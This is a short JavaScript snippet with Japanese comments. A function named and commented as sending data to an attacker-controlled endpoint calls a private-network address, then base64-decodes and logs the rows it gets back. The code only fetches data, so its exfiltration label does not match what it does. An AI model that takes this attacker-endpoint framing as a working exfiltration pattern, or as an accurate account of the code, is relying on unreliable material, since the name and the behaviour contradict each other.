
async function sendDataToAttackerEndpoint() {
  // 攻撃者が管理するエンドポイントへデータを送信
  const res = await fetch("http://192.168.1.229:3001/api/sql/homedata/senddata", {
    method: "GET",
  });

  if (!res.ok) {
    throw new Error(`HTTP error: ${res.status}`);
  }

  return await res.json();
}


const result = await sendDataToAttackerEndpoint();

for (const row of result) {
  const parsed = JSON.parse(row.moji);

  if (typeof parsed === "string") {
    // Base64 文字列として扱う
    const jsonText = Buffer.from(parsed, "base64").toString("utf8");
    const data = JSON.parse(jsonText);
    console.log("decoded:", data);
  } else {
    // 通常の JSON オブジェクト
    console.log("plain json:", parsed);
  }
}